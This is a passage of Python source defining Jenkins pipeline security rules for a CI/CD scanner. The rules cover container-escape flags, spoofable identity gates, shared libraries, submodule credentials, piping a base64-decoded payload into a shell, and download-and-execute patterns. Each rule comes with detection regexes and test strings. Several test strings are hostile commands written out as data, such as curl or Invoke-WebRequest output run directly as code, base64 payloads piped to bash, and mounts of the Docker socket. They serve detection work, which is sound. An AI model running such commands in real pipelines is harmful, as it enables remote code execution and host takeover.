            # No --privileged.
            "agent { docker { image 'ubuntu:22.04' args '-v /tmp:/tmp' } }",
            # Narrow capability instead of blanket privilege.
            "agent { docker { image 'builder' args '--cap-add=SYS_PTRACE' } }",
            # Plain inside without args.
            "docker.image('ubuntu:22.04').inside { sh 'make' }",
            # Comment line.
            "// agent { docker { image 'x' args '--privileged' } }",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "A privileged Docker container has full access to all host "
            "kernel capabilities and can escape the container namespace "
            "into the Jenkins agent itself.  On shared, long-lived "
            "Jenkins agents a single compromised privileged build "
            "compromises the host: subsequent builds on the same agent "
            "inherit the poisoned environment, and any "
            "``withCredentials`` scope used by any future pipeline "
            "running on that agent becomes readable to an attacker who "
            "persisted a hook (e.g., a modified shell profile, a "
            "backdoored binary in the agent's PATH)."
        ),
    ),
    # =========================================================================
    # SEC8-JK-005 — Docker container escape flags beyond --privileged.
    # SEC8-JK-004 only matches ``--privileged``.  These other flags are
    # each a container-escape primitive on their own: mounting the host
    # Docker socket (daemon takeover), sharing the host network / PID /
    # IPC namespace, or adding near-root capabilities.  Deliberately does
    # NOT flag ``--cap-add=SYS_PTRACE`` — that narrow capability is the
    # SAFE alternative SEC8-JK-004's own remediation recommends, so
    # matching all ``--cap-add`` here would contradict it.  The host
    # socket path is unambiguous and fires on its own; the namespace /
    # capability flags are anchored to a docker container construct
    # (mirroring SEC8-JK-004's anchors) so an unrelated ``--pid=host``
    # in prose does not fire.
    Rule(
        id="SEC8-JK-005",
        title="Docker container escape flag (host socket / namespace / near-root capability)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Docker container is launched with a flag that breaks container "
            "isolation, short of (and distinct from) ``--privileged``: mounting "
            "the host Docker socket (``-v /var/run/docker.sock``), sharing the "
            "host network/PID/IPC namespace (``--network=host``, ``--pid=host``, "
            "``--ipc=host``), or granting a near-root capability "
            "(``--cap-add=ALL`` / ``--cap-add=SYS_ADMIN``). Each is, on its own, "
            "a route out of the container onto the Jenkins agent host. Mounting "
            "the daemon socket is the most direct: any process in the container "
            "can create a new container that bind-mounts the host root filesystem."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # Host Docker socket mounted in — unambiguous, fires alone.
                r"-v\s+[^'\"\n]*?/var/run/docker\.sock"
                r"|"
                # Host-namespace / near-root capability flags, only inside a
                # docker container construct (args '...', .inside(...),
                # .withRun(...), or a shell `docker run`).
                r"(?:args\s+['\"]|\.(?:inside|withRun)\s*\(\s*['\"]|docker\s+run\b)"
                r"[^'\"\n]*"
                r"(?:--net(?:work)?=host|--pid=host|--ipc=host"
                r"|--cap-add[ =]['\"]?(?:ALL|SYS_ADMIN))\b"
                r")"
            ),
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Remove the isolation-breaking flag. Build/test containers almost "
            "never need it:\n\n"
            "// BAD — daemon socket gives full host control\n"
            "agent { docker { image 'builder' args '-v /var/run/docker.sock:/var/run/docker.sock' } }\n\n"
            "// BAD — host network namespace\n"
            "docker.image('builder').inside('--network=host') { sh 'make' }\n\n"
            "// GOOD — no host bridge; if you must build images, use a\n"
            "// rootless/daemonless builder (Kaniko, BuildKit rootless) on a\n"
            "// dedicated ephemeral agent, and request only the single narrow\n"
            "// capability the build actually needs (e.g. --cap-add=SYS_PTRACE).\n"
            "agent { docker { image 'builder' } }"
        ),
        reference="https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities",
        test_positive=[
            "agent { docker { image 'x' args '-v /var/run/docker.sock:/var/run/docker.sock' } }",
            "docker.image('x').inside('--network=host') { sh 'make' }",
            "agent { docker { image 'x' args '--pid=host' } }",
            "docker.image('b').withRun('--cap-add=SYS_ADMIN --rm') { c -> sh 'x' }",
            "sh 'docker run --net=host --rm ubuntu make'",
        ],
        test_negative=[
            # Benign bind mount.
            "agent { docker { image 'x' args '-v /tmp:/tmp' } }",
            # Narrow capability — the SAFE alternative SEC8-JK-004 recommends.
            "agent { docker { image 'builder' args '--cap-add=SYS_PTRACE' } }",
            # No flags.
            "docker.image('ubuntu:22.04').inside { sh 'make' }",
            # Comment.
            "// docker.image('x').inside('--network=host') { sh 'make' }",
            # --pid=host outside any docker construct must not fire.
            "sh 'echo configure --pid=host in docs'",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Each flag is a self-contained escape: the host Docker socket lets "
            "the container spawn a sibling that mounts the host root; "
            "``--network=host`` exposes host-local services (the metadata "
            "endpoint, other containers' ports); ``--pid=host`` allows "
            "ptrace/inspection of host processes; ``--cap-add=SYS_ADMIN`` is "
            "near-equivalent to ``--privileged``. On a shared, long-lived "
            "Jenkins agent the escape persists across later builds and exposes "
            "every future pipeline's credentials on that node."
        ),
    ),
    # =========================================================================
    # SEC4-JK-007: Security gate keyed on a spoofable PR-author / actor
    # identity.  Jenkins port of SEC4-GH-010.  The JK analog of
    # ``github.actor`` is ``env.CHANGE_AUTHOR`` (Multibranch) /
    # ``env.ghprbPullAuthorLogin`` (legacy GHPRB) / ``env.BUILD_USER``
    # (Build User Vars plugin) / ``params.TRIGGERED_BY`` — all string
    # values that an attacker can spoof by setting up a matching fork
    # account or by pushing a follow-up commit after a trusted actor's
    # build.  Same confused-deputy class as the Dependabot auto-merge
    # bypass on GitHub.
    # =========================================================================
    Rule(
        id="SEC4-JK-007",
        title=("Security gate uses spoofable CHANGE_AUTHOR / ghprb / BUILD_USER identity check"),
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkinsfile gates access — a ``when { expression "
            "{ ... } }`` block, a Groovy ``if`` check, or a "
            "conditional step — on a string equality against "
            "``env.CHANGE_AUTHOR``, ``env.ghprbPullAuthorLogin``, "
            "``env.BUILD_USER``, or ``params.TRIGGERED_BY``.  "
            "These fields reflect the user who triggered the build, "
            "not a cryptographic identity: an attacker can register "
            "a fork account with the matching login, or push a "
            "follow-up commit after a trusted actor's run, and "
            "inherit the gate's trust level.  The same confused-"
            "deputy pattern as ``github.actor`` on GitHub Actions."
        ),
        pattern=RegexPattern(
            match=(
                # Groovy equality / regex-match against identity fields
                r"\benv\.(?:CHANGE_AUTHOR(?:_EMAIL|_DISPLAY_NAME)?"
                r"|ghprbPullAuthorLogin(?:Mention)?"
                r"|ghprbTriggerAuthor(?:Login|Email)?"
                r"|BUILD_USER(?:_ID|_EMAIL)?)\b"
                r"\s*(?:==|!=|=~|equals\s*\()"
                r"\s*['\"/]"
            ),
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
            ],
        ),
        remediation=(
            "Don't gate access on a string-match against an identity\n"
            "field the attacker can set.  Safer shapes:\n\n"
            "1. Gate on branch / ref identity — only the repo owner\n"
            "   can push to a protected branch:\n\n"
            "       when { branch 'main' }\n\n"
            "2. Gate on ``changeRequest()`` vs ``NOT changeRequest()``\n"
            "   — different trust models for PR builds vs pushes:\n\n"
            "       when { not { changeRequest() } }\n\n"
            "3. For bot-account auto-merge, use the Jenkins credential\n"
            "   store to bind a scoped token tied to the bot's\n"
            "   authentication rather than a string check — a fork-\n"
            "   account takeover can fake the login string but can't\n"
            "   mint the bot's API token.\n\n"
            "4. For ``parameters { string ... }`` inputs that drive\n"
            "   access control, validate against a strict allowlist\n"
            "   and fail the build on mismatch — never trust the\n"
            "   parameter value directly."
        ),
        reference=(
            "https://www.jenkins.io/doc/book/pipeline/syntax/"
            "#when; "
            "https://docs.github.com/en/actions/security-for-github-"
            "actions/security-guides/security-hardening-for-github-"
            "actions#using-permissions-to-restrict-access-to-secrets"
        ),
        test_positive=[
            # Classic equality
            "when { expression { env.CHANGE_AUTHOR == 'dependabot[bot]' } }",
            "if (env.ghprbPullAuthorLogin == 'renovate-bot') {",
            "if (env.BUILD_USER == 'ci-maintainer') {",
            # Groovy regex-match
            "if (env.CHANGE_AUTHOR =~ /^(dependabot|renovate)/) {",
            # Trigger-author arm
            "when { expression { env.ghprbTriggerAuthorLogin == 'release-bot' } }",
        ],
        test_negative=[
            # Safe shape — branch-based gating
            "when { branch 'main' }",
            # changeRequest() semantic
            "when { not { changeRequest() } }",
            # Comparing to non-string (e.g. null-check) — not a gate
            "if (env.CHANGE_AUTHOR != null) { echo 'PR build' }",
            # Comment
            "// if (env.CHANGE_AUTHOR == 'bot') {",
            "# when { expression { env.CHANGE_AUTHOR == 'bot' } }",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "``env.CHANGE_AUTHOR`` and related identity fields are "
            "populated from SCM metadata with no cryptographic "
            "binding to the triggering user.  An attacker who "
            "registers a fork account whose login matches the "
            "allow-listed value satisfies the gate; on long-lived "
            "Multibranch agents, pushing a follow-up commit after a "
            "trusted actor's build can also inherit the trust level "
            "for the next run.  The Dependabot auto-merge bypass on "
            "GitHub (``github.actor`` confused-deputy) is the same "
            "pattern applied to a different CI platform."
        ),
        incidents=[
            "Dependabot auto-merge bypass class (GH analog)",
        ],
    ),
    # =========================================================================
    # SEC3-JK-005 — shared-library inventory (review-needed)
    # =========================================================================
    #
    # Fires INFO once per ``@Library('...')`` or ``library('...')``
    # reference in a Jenkinsfile.  Built for the ``--baseline`` /
    # ``--diff`` workflow: initial scan lists every shared library in
    # use; subsequent scans surface only NEW libraries in diff output.
    # Distinct from SEC3-JK-001 (shared library loaded without SHA
    # pinning — HIGH).  Inventory has zero implicit threat assessment;
    # it surfaces the external-code surface for one-time review.
    Rule(
        id="SEC3-JK-005",
        title="Jenkins shared library used (inventory; review-needed)",
        severity=Severity.INFO,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        finding_family="Mutable dependency references",
        description=(
            "The Jenkinsfile loads a Jenkins shared library via "
            "``@Library('<id>')`` or ``library('<id>')``.  Shared "
            "libraries are Groovy code that runs as part of the "
            "pipeline with the build agent's credentials and the "
            "``withCredentials`` scope active at the load site — every "
            "library is a code-execution dependency.  Use "
            "``--baseline`` to snapshot the current set of libraries "
            "and ``--diff`` to surface only newly-added libraries in "
            "subsequent scans."
        ),
        pattern=RegexPattern(
            # Matches all four forms:
            #   @Library('lib-name@ref') _
            #   @Library(['lib-name@ref']) _              # list form
            #   @Library(['lib1@v1', 'lib2@v2']) _        # multi-lib list
            #   library('lib-name@ref')
            #   library identifier: 'lib-name@ref', retriever: ...
            #
            # The optional ``\[?`` after the opening paren handles the
            # list form used by Jenkinsfiles that load multiple
            # libraries at once (e.g., cloudogu/ecosystem). For
            # multi-library lists, the rule fires once per line — fine
            # for inventory purposes since the line itself is the
            # dependency-declaration site.
            match=r"(?:@Library|\blibrary)\s*\(?\s*\[?\s*(?:identifier:\s*)?['\"]([^'\"]+)['\"]",
            exclude=[
                r"^\s*//",
                r"^\s*\*",
            ],
        ),
        remediation=(
            "Each finding is the *first* occurrence of a shared "
            "library in this scan; review the library's repository, "
            "publisher, and how it pins its own dependencies, then "
            "snapshot the inventory with ``--baseline``.  After "
            "baseline, only NEW libraries surface in ``--diff`` "
            "output.  Pin to a SHA-style identifier where possible "
            "(see SEC3-JK-001 for severity-graded pinning advice)."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/",
        test_positive=[
            "@Library('my-shared-lib@v1.0') _",
            'library("acme-corp/jenkins-lib@main")',
            "library identifier: 'foo@bar', retriever: modernSCM(...)",
            # List form — used by cloudogu/ecosystem in the wild.
            "@Library(['github.com/cloudogu/dogu-build-lib@v1.0.0']) _",
            # List form with multiple libraries on one line.
            "@Library(['lib1@v1.0', 'lib2@v2.0']) _",
        ],
        test_negative=[
            "// @Library('my-shared-lib@v1.0') _",
            " * library example",
            # Just the word library appearing somewhere — not a load.
            "echo 'library updated'",
        ],
        stride=["T"],
        threat_narrative=(
            "Shared libraries execute as Groovy in the same JVM as the "
            "pipeline, with full access to the build node's secrets, "
            "credentials, and filesystem.  A library compromise — "
            "force-pushed branch ref, maintainer takeover, or a "
            "library author's credentials being phished — turns into "
            "code execution in every pipeline that loads the library. "
            "This rule does not claim any specific library is "
            "malicious; it surfaces the dependency surface so a human "
            "reviewer can make the trust decision once, with "
            "``--baseline`` / ``--diff`` ensuring new additions don't "
            "slip through."
        ),
        confidence="medium",
    ),
    # =========================================================================
    # SEC3-JK-006 — Git SubmoduleOption forwards parent credentials or
    # tracks a mutable submodule branch.  ``parentCredentials: true``
    # hands the parent repo's checkout credential to every submodule
    # fetch — if any submodule URL points at a host the attacker controls
    # (or is later repointed), the token leaks to that host.
    # ``trackingSubmodules: true`` fetches the tip of the submodule's
    # tracked branch instead of the gitlink-pinned commit, so submodule
    # content can change underneath the build (mutable supply chain).
    # Neither is matched by SEC3-JK-001/005 (shared-library rules); both
    # have legitimate uses (private submodules), hence review-needed.
    # =========================================================================
    Rule(
        id="SEC3-JK-006",
        title="Git submodule forwards parent credentials or tracks a mutable branch",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        confidence="medium",
        finding_family="Mutable dependency references",
        description=(
            "A ``checkout`` step's ``SubmoduleOption`` extension sets "
            "``parentCredentials: true`` and/or ``trackingSubmodules: true``. "
            "``parentCredentials: true`` forwards the parent repository's "
            "checkout credential to every submodule fetch — if a submodule URL "
            "resolves to a host outside your trust boundary, that credential is "
            "sent to it. ``trackingSubmodules: true`` fetches the latest commit "
            "on the submodule's tracked branch instead of the commit the "
            "superproject pins, so the submodule's code can change between "
            "builds with no change in this repository. Review the submodule "
            "sources before keeping either option."
        ),
        pattern=RegexPattern(
            match=r"(?:parentCredentials|trackingSubmodules)\s*:\s*[Tt]rue\b",
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Prefer the safe defaults (both options absent / false):\n\n"
            "checkout([$class: 'GitSCM',\n"
            "  userRemoteConfigs: [[url: 'https://github.com/org/repo.git']],\n"
            "  extensions: [[$class: 'SubmoduleOption',\n"
            "    recursiveSubmodules: true]]])   // pinned commits, no cred forwarding\n\n"
            "If a private submodule genuinely needs authentication, scope a "
            "dedicated read-only deploy key to that submodule rather than "
            "forwarding the parent credential, and leave ``trackingSubmodules`` "
            "off so the superproject's pinned commit is honoured."
        ),
        reference="https://plugins.jenkins.io/git/#plugin-content-submodules",
        test_positive=[
            "extensions: [[$class: 'SubmoduleOption', parentCredentials: true]]",
            "[$class: 'SubmoduleOption', trackingSubmodules: true, recursiveSubmodules: true]",
        ],
        test_negative=[
            "[$class: 'SubmoduleOption', parentCredentials: false]",
            # recursive alone fetches the PINNED submodule commits — safe.
            "[$class: 'SubmoduleOption', recursiveSubmodules: true]",
            "// parentCredentials: true",
        ],
        stride=["S", "T"],
        threat_narrative=(
            "With ``parentCredentials: true`` the parent checkout token is sent "
            "to every submodule remote; an attacker who can influence a "
            "submodule URL (a typo-squatted host, a repointed ``.gitmodules`` in "
            "a PR) harvests that credential. With ``trackingSubmodules: true`` "
            "the submodule floats to its branch tip, so a maintainer of the "
            "submodule project can inject code into this build without touching "
            "the superproject's pinned gitlink."
        ),
    ),
    # =========================================================================
    # SEC4-JK-006: ``base64 -d | shell`` obfuscation in pipeline shell call
    # =========================================================================
    # Jenkins port of SEC4-GH-022 / SEC4-GL-008.
    # Encoded payloads inside ``sh '...'`` (or ``bat``) calls bypass
    # diff-review and string-pattern scanners.  Same threat shape as
    # the GitHub Actions and GitLab CI rules; Jenkins's `sh ''` is the
    # equivalent shell sink.
    Rule(
        id="SEC4-JK-006",
        title="Base64-decoded payload piped directly into shell or interpreter (Jenkins)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        finding_family="script_injection",
        description=(
            "A Jenkins pipeline ``sh '...'`` (or ``bat``) call decodes "
            "a base64 string and pipes the decoded bytes directly into "
            "bash / sh / zsh / fish / python / perl / ruby / node.  "
            "Encoded payloads bypass diff-review heuristics and string-"
            "pattern scanners that don't decode before matching."
        ),
        pattern=RegexPattern(
            match=(
                # Same regex shape as SEC4-GH-022 / SEC4-GL-008.
                # ``\b`` after the interpreter list prevents matching
                # ``sh`` inside ``sha256sum`` / ``shasum``.
                r"\|\s*base64\s+(-d|--decode)\s*\|\s*(bash|sh|zsh|fish|python|perl|ruby|node)\b"
                r"|\bopenssl\s+enc\s+(-d|-base64|-d\s+-base64|-base64\s+-d)[^|\n]*\|\s*(bash|sh|zsh|python|perl)\b"
            ),
            exclude=[r"^\s*//", r"^\s*#"],
        ),
        remediation=(
            "Never pipe a decoded payload to a shell.  If the encoded "
            "data is legitimately needed, decode to a file, verify a "
            "checksum, and only then execute:\n"
            "  sh '''\n"
            '    echo "$ENCODED" | base64 -d > payload.bin\n'
            "    sha256sum -c payload.sha256\n"
            "    ./payload.bin\n"
            "  '''"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        test_positive=[
            "        sh 'echo aHR0cHM6Ly9 | base64 -d | bash'",
            '        sh "echo $X | base64 --decode | sh"',
            "        sh 'echo $PAYLOAD | base64 -d | python'",
            "        sh 'openssl enc -d -base64 <<< $X | bash'",
        ],
        test_negative=[
            "        sh 'echo $X | base64 -d > payload.bin'",
            "        sh 'echo $PASSWORD | base64'",
            "        sh 'echo $X | base64 -d | sha256sum'",
            "        // sh 'echo $X | base64 -d | bash'",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Encoded payloads are the canonical fingerprint of supply-"
            "chain attack code: documented incidents in GitHub Actions "
            "used base64-encoded shells to evade diff reviewers and "
            "static scanners.  Jenkins ``sh`` calls offer the same "
            "evasion surface — executing any decoded payload gives an "
            "attacker arbitrary code execution on the runner with "
            "access to bound credentials and shared-library state."
        ),
        incidents=["Ultralytics (Dec 2024, GH analog)", "Trivy supply chain (Mar 2026, GH analog)"],
    ),
    # =========================================================================
    # SEC4-JK-008: ``env.<USER_VAR>`` interpolated into sh — taint
    # transit between stages.  Jenkins analog of SEC4-GH-021.
    # =========================================================================
    Rule(
        id="SEC4-JK-008",
        title="Stage env.<USER_VAR> interpolated into sh — review upstream provenance",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="low",
        description=(
            'A ``sh "...${env.<VAR>}..."`` interpolation references a '
            "user-defined env variable in a GString (double-quoted "
            "Groovy string).  Pipeline env variables flow between "
            "stages — a stage that assigns ``env.X = ...`` from "
            "``params.X``, ``currentBuild.upstreamBuilds[0].buildVariables.X``, "
            "file contents, or any other attacker-controllable source "
            "produces an env value that, when spliced into a later "
            "stage's shell, is the same threat shape as SEC4-JK-001's "
            "direct ``${params.X}`` splice.  Review the assigning "
            "stage's provenance: if the value can carry attacker "
            "bytes, sanitise at the assignment site (allowlist regex) "
            "before writing to ``env.X``, or move the consuming "
            "``sh`` to a single-quoted GString so Groovy leaves the "
            "expression unexpanded."
        ),
        # J2: migrated to the structural island reader (quote-aware predicate);
        # catches sh(script: ...), GString-only via `interpolated`.
        pattern=_JenkinsfileShellLeafPattern(_sec4_jk_008_predicate),
        remediation=(
            "Either move the value through to the consumer's shell "
            "via a single-quoted (non-interpolating) Groovy string so "
            "the shell sees the literal expression and you can quote "
            "it as a shell variable:\n"
            "\n"
            "  sh 'echo \"$MY_VAR\"'\n"
            "\n"
            "or sanitise at the assigning stage before writing to "
            "``env.X``:\n"
            "\n"
            "  stage('Prep') {\n"
            "    steps { script {\n"
            "      env.SAFE_BRANCH = params.BRANCH.replaceAll(/[^A-Za-z0-9_.-]/, '')\n"
            "    } }\n"
            "  }\n"
            "\n"
            "This rule is review-needed because the taint source is "
            "not visible from the consuming line alone — it depends "
            "on the upstream assignment."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            '        sh "echo ${env.RELEASE_TAG}"',
            '        sh "deploy.sh --env=${env.DEPLOY_TARGET}"',
        ],
        test_negative=[
            # Built-in env vars — Jenkins server-set, not pipeline-author-set.
            '        sh "echo ${env.JOB_NAME}-${env.BUILD_NUMBER}"',
            '        sh "checkout ${env.GIT_COMMIT}"',
            # Single-quoted GString — Groovy doesn't interpolate.
            "        sh 'echo \"$MY_VAR\"'",
            # Comment.
            '        // sh "echo ${env.RELEASE_TAG}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Jenkins pipeline env variables are a cross-stage transit "
            "channel for attacker-controllable bytes.  A pipeline "
            "author who carefully wraps ``${params.X}`` in a "
            "single-quoted shell can still be compromised when an "
            "earlier stage assigns ``env.X = params.X`` and a later "
            "stage interpolates ``env.X`` into a GString.  "
            "SEC4-JK-001 catches the direct params splice; this rule "
            "surfaces the transit form for upstream-stage review."
        ),
    ),
    # =========================================================================
    # SEC9-JK-004: download-pipe-to-interpreter / process-substitution /
    # PowerShell remote-execution inside a Jenkinsfile shell sink.
    #
    # Consumes the structural Jenkinsfile reader (optional
    # ``[jenkins-structural]`` extra) so the predicate only sees
    # actual ``sh|bat|powershell`` bodies — not arbitrary Groovy
    # string literals.  Net-new over SEC9-JK-001 (which is regex /
    # line-scoped) on three shapes the line-regex can't reach:
    #
    #   * ``curl ... | python -c "..."`` and other non-shell
    #     interpreter pipes (the SEC9-JK-001 regex stops at ``(ba)?sh``).
    #   * ``bash <(curl ...)`` process substitution (no ``|`` token).
    #   * Multi-line triple-quoted bodies where the offending
    #     curl-pipe-bash is on a body line, not the ``sh '''`` opener
    #     (the line-scoped regex never sees the pair on one line).
    #
    # SEC9-JK-001 / SEC9-JK-003 stay in place to cover the
    # zero-runtime-dependency default install (no extra) and the
    # narrower line-scoped shapes they already handle reliably.
    # =========================================================================
    Rule(
        id="SEC9-JK-004",
        title=(
            "Jenkinsfile shell sink runs downloaded content "
            "(curl|interpreter, process substitution, iex(IWR))"
        ),
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline shell sink (``sh '...'`` / "
            "``bat '...'`` / ``powershell '...'``) downloads content "
            "from a remote host and executes it without integrity "
            "verification.  Catches three shapes the line-scoped "
            "SEC9-JK-001 / SEC9-JK-003 regexes cannot reach:\n"
            "\n"
            "  1. ``curl|wget`` piped to a non-shell interpreter "
            "(``| python``, ``| python3``, ``| perl``, ``| ruby``, "
            "``| node``, ``| php``) — same RCE shape, different "
            "interpreter.\n"
            "  2. Process substitution: ``bash <(curl ...)`` / "
            "``sh <(curl ...)``.  No ``|`` token, so ``\\|\\s*(ba)?sh`` "
            "regexes miss it.\n"
            "  3. PowerShell ``iex(Invoke-WebRequest ...)`` / "
            "``iwr ... | iex`` / ``Invoke-Expression(New-Object "
            "System.Net.WebClient).DownloadString(...)`` — the "
            "Windows-agent equivalent of curl|bash.\n"
            "\n"
            "Consumes the structural Jenkinsfile reader so only "
            "actual shell-sink bodies are scanned — not arbitrary "
            "Groovy string literals or comments that merely "
            "contain the substring ``curl | bash``.  Requires the "
            "optional ``[jenkins-structural]`` extra "
            "(``pip install 'taintly[jenkins-structural]'``).  "
            "Default install: rule is silent and SEC9-JK-001 / "
            "SEC9-JK-003 continue to cover the line-scoped shapes."
        ),
        pattern=_JenkinsfileShellLeafPattern(_sec9_jk_004_predicate),
        remediation=(
            "Download the script separately, verify its SHA-256 "
            "checksum (or signature), then execute:\n\n"
            "  // BAD — non-shell interpreter pipe\n"
            "  sh 'curl -fsSL https://x.com/install.py | python3'\n\n"
            "  // BAD — process substitution\n"
            "  sh 'bash <(curl -fsSL https://x.com/install.sh)'\n\n"
            "  // BAD — PowerShell remote execution\n"
            "  powershell 'iex(Invoke-WebRequest -Uri "
            "https://x.com/setup.ps1).Content'\n\n"
            "  // GOOD — fetch, verify, execute\n"
            "  sh '''\n"
            "      curl -fsSL https://x.com/install.sh -o install.sh\n"
            "      echo 'abc123def456...  install.sh' | "
            "sha256sum --check\n"
            "      bash install.sh\n"
            "      rm install.sh\n"
            "  '''\n"
        ),
        reference=(
            "https://owasp.org/www-project-top-10-ci-cd-security-risks/"
            "CICD-SEC-09-Improper-Artifact-Integrity-Validation"
        ),
        test_positive=[
            # 1) curl | non-shell interpreter (walker-only — SEC9-JK-001 misses)
            (
                "pipeline {\n"
                "  agent any\n"
                "  stages {\n"
                "    stage('Setup') {\n"
                "      steps {\n"
                "        sh 'curl -fsSL https://x.com/i.py | python3'\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
            # 2) bash <(curl ...) process substitution (walker-only)
            (
                "pipeline {\n"
                "  agent any\n"
                "  stages {\n"
                "    stage('Setup') {\n"
                "      steps {\n"
                "        sh 'bash <(curl -fsSL https://x.com/i.sh)'\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
            # 3) PowerShell iex(Invoke-WebRequest ...) (walker-only)
            (
                "pipeline {\n"
                "  agent { label 'windows' }\n"
                "  stages {\n"
                "    stage('Setup') {\n"
                "      steps {\n"
                "        powershell 'iex(Invoke-WebRequest -Uri "
                "https://x.com/s.ps1).Content'\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
            # 4) iwr | iex alt arrangement
            (
                "pipeline {\n"
                "  agent { label 'windows' }\n"
                "  stages {\n"
                "    stage('Setup') {\n"
                "      steps {\n"
                "        powershell 'iwr -useb https://x.com/s.ps1 | iex'\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
        ],
        test_negative=[
            # Safe: separate fetch + sha256sum verify + bash <file>.
            (
                "pipeline {\n"
                "  agent any\n"
                "  stages {\n"
                "    stage('Setup') {\n"
                "      steps {\n"
                "        sh '''\n"
                "            curl -fsSL https://x.com/i.sh -o i.sh\n"
                "            echo 'abc i.sh' | sha256sum --check\n"
                "            bash i.sh\n"
                "        '''\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
            # Curl to API endpoint piped to jq — not an interpreter, safe.
            (
                "pipeline {\n"
                "  agent any\n"
                "  stages {\n"
                "    stage('Check') {\n"
                "      steps {\n"
                "        sh 'curl -s https://api.x.com/v1 | jq .ok'\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
            # Pure bash with a local file — no remote download.
            (
                "pipeline {\n"
                "  agent any\n"
                "  stages {\n"
                "    stage('Build') {\n"
                "      steps {\n"
                "        sh 'bash ./build.sh && echo done'\n"
                "      }\n"
                "    }\n"
                "  }\n"
                "}\n"
            ),
            # Literal substring in an unrelated environment{} string —
            # walker yields value_kind='string', not 'shell', so this
            # pattern's predicate never sees it.
            (
                "pipeline {\n"
                "  agent any\n"
                "  environment {\n"
                "    DOC_NOTE = 'avoid curl https://x | bash patterns'\n"
                "  }\n"
                "  stages {\n"
                "    stage('Build') { steps { sh 'make' } }\n"
                "  }\n"
                "}\n"
            ),
        ],
        stride=["T"],
        threat_narrative=(
            "A Jenkins build agent that fetches a remote payload and "
            "feeds it straight to an interpreter executes whatever the "
            "remote endpoint returns at build time.  A CDN compromise, "
            "DNS hijack, or hosting-account takeover substitutes "
            "attacker-chosen bytes for the expected installer, and the "
            "payload runs with the agent's bound credentials, "
            "``withCredentials`` scope, and persistent workspace.  This "
            "rule covers the non-shell interpreter pipes, process-"
            "substitution shapes, and PowerShell remote-execution "
            "shapes that the line-scoped SEC9-JK-001 regex cannot "
            "see; the structural reader limits firing to actual "
            "``sh|bat|powershell`` bodies so unrelated Groovy literals "
            "do not produce false positives."
        ),
    ),
    # =========================================================================
    # SEC6-JK-010: world-writable permissions (chmod 777) in a sh step
    # =========================================================================
    Rule(
        id="SEC6-JK-010",
        title="chmod 777 (world-writable permissions) in a Jenkins sh step",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins ``sh`` step sets world-writable permissions "
            "(``chmod 777`` / ``chmod -R 777`` / ``chmod a+rwx``). On the "
            "self-hosted agents Jenkins typically runs on, a world-writable "
            "file is a persistence vector: any process — or an attacker who "
            "achieved initial execution — can modify it, and the change "
            "survives across builds on the same agent. Cross-platform sibling "
            "of SEC6-GL-005 (GitLab) and SEC6-GH-014 (GitHub)."
        ),
        pattern=RegexPattern(
            match=r"chmod\s+(-R\s+)?(0?777|a\+rwx)",
            exclude=[r"^\s*#", r"^\s*//"],
        ),
        remediation="Use minimal permissions: chmod 755 for executables, chmod 644 for files.",
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        test_positive=[
            '                sh "chmod -R 777 ."',
            "                sh 'chmod 777 /var/jenkins_home/workspace'",
        ],
        test_negative=[
            '                sh "chmod 755 deploy.sh"',
            "                // chmod 777 is bad practice",
        ],
        stride=["E"],
        threat_narrative=(
            "World-writable files on a self-hosted Jenkins agent persist across "
            "builds and can be modified by any concurrent job or a foothold "
            "attacker — a classic post-exploitation persistence mechanism where "
            "a modified build script survives to the next pipeline run."
        ),
    ),
    # =========================================================================
    # SEC6-JK-011: bound credential run through an encode/obfuscate transform
    #              inside a shell step — Jenkins log-masking bypass.
    # =========================================================================
    Rule(
        id="SEC6-JK-011",
        title=("Bound credential encoded/obfuscated in a shell step (Jenkins log-masking bypass)"),
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        confidence="medium",
        finding_family="secret_exposure",
        description=(
            "A credential bound by ``withCredentials`` (``variable:`` / "
            "``passwordVariable:`` / ``usernameVariable:`` / ``keyFileVariable:`` "
            "/ ``tokenVariable:``) or by a ``NAME = credentials('id')`` "
            "``environment {}`` assignment is run through an encode / obfuscate "
            "transform inside a ``sh`` / ``bat`` / ``powershell`` / ``pwsh`` step: "
            "``base64`` (encode), ``rev``, ``xxd``, ``od``, ``hexdump``, "
            "``tr``, ``openssl enc``, or ``gpg --encrypt``.\n\n"
